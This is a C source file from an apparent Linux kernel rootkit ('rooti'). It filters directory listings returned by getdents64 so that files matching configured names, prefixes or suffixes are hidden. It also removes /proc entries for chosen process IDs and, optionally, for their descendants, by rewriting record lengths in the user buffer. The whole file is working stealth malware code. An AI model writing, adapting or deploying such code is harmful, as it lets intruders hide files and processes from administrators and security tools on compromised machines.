#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/pid.h>
#include "dentry.h"
#include "../../state.h"
#include "../../utils.h"
#include "../../config.h"

static bool rooti_should_hide_file_by_name(struct linux_dirent64 *record)
{
    for (int i = 0; i < ROOTI_HIDDEN_FILES_COUNT; i++) {
        if (strncmp(record->d_name, ROOTI_HIDDEN_FILES[i], NAME_MAX) == 0) {
            return true;
        }
    }
    return false;
}

static bool rooti_should_hide_file_by_prefix(struct linux_dirent64 *record)
{
    size_t filename_len = strlen(record->d_name);
    size_t prefix_len = 0;
    
    for (int i = 0; i < ROOTI_HIDDEN_FILES_PREFIXES_COUNT; i++) {
        prefix_len = strlen(ROOTI_HIDDEN_FILES_PREFIXES[i]);
        if (filename_len >= prefix_len &&
            memcmp(record->d_name, ROOTI_HIDDEN_FILES_PREFIXES[i], prefix_len) == 0) {
            return true;
        }
    }
    return false;
}

static bool rooti_should_hide_file_by_suffix(struct linux_dirent64 *record)
{
    size_t filename_len = strlen(record->d_name);
    size_t suffix_len = 0;

    for (int i = 0; i < ROOTI_HIDDEN_FILES_SUFFIXES_COUNT; i++) {
        suffix_len = strlen(ROOTI_HIDDEN_FILES_SUFFIXES[i]);
        if (filename_len >= suffix_len &&
            memcmp(record->d_name + filename_len - suffix_len,
                ROOTI_HIDDEN_FILES_SUFFIXES[i], suffix_len) == 0) {
            return true;
        }
    }
    return false;
}

static bool rooti_should_hide_file(struct linux_dirent64 *record)
{
    if (rooti_should_hide_file_by_name(record))
        return true;
    if (rooti_should_hide_file_by_prefix(record))
        return true;
    if (rooti_should_hide_file_by_suffix(record))
        return true;
    return false;
}

static bool rooti_should_hide_proc(struct linux_dirent64 *record)
{
    pid_t pid;
    int err;

    err = kstrtoint(record->d_name, 0, &pid);
    if (err)
        return false;

#ifndef ROOTI_HIDE_CHILD_PROCS
    return rooti_pid_list_contains(pid, &rooti_hidden_pids);
#else
    struct pid *pid_struct;
    struct task_struct *task;

    rcu_read_lock();

    pid_struct = find_vpid(pid);
    if (pid_struct == NULL) {
        rcu_read_unlock();
        ROOTI_DEBUG("find_vpid() failed");
        return false;
    }
        
    task = pid_task(pid_struct, PIDTYPE_PID);
    if (task == NULL) {
        rcu_read_unlock();
        ROOTI_DEBUG("pid_task() failed");
        return false;
    }

    while (task != &init_task) {
        if (rooti_pid_list_contains(task->pid, &rooti_hidden_pids)) {
            rcu_read_unlock();
            return true;
        }
        task = rcu_dereference(task->real_parent); 
    }
    
    rcu_read_unlock();
    return false;
#endif
}

static size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record,
                                     struct linux_dirent64 *prev_record, size_t count)
{
    if (prev_record == NULL) {
        // Shift the entire buffer to override the first record
        count -= curr_record->d_reclen;
        memmove(curr_record, (void *)curr_record + curr_record->d_reclen, count);
    } else {
        // Makes the reader skip over this record
        prev_record->d_reclen += curr_record->d_reclen;
    }
    return count;
}

static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_t count,
                                       bool is_proc_dir)
{
    struct linux_dirent64 *curr_record = NULL;
    struct linux_dirent64 *prev_record = NULL;
    unsigned long offset = 0;
    
    while (offset < count) {
        curr_record = (void *)records_buf + offset;
        if (rooti_should_hide_file(curr_record) || (is_proc_dir && rooti_should_hide_proc(curr_record))) {
            count = rooti_filter_dir_entry(curr_record, prev_record, count);
            if (curr_record == records_buf) {
                continue;
            }
        } else {
            prev_record = curr_record;
        }
        offset += curr_record->d_reclen;
    }
    return count;
}

size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir)
{
    struct linux_dirent64 *kernel_buf = kmalloc(count, GFP_KERNEL);
    int ret;

    if (kernel_buf == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return count;
    }

    ret = copy_from_user(kernel_buf, user_buf, count);
    if (ret > 0) {
        ROOTI_DEBUG("copy_from_user() failed: %d", ret);
        kfree(kernel_buf);
        return count;
    }

    count = rooti_filter_dir_entries(kernel_buf, count, is_proc_dir);

    ret = copy_to_user(user_buf, kernel_buf, count);
    if (ret > 0) {
        ROOTI_DEBUG("copy_to_user() failed: %d", ret);
    }

    kfree(kernel_buf);
    return count;
}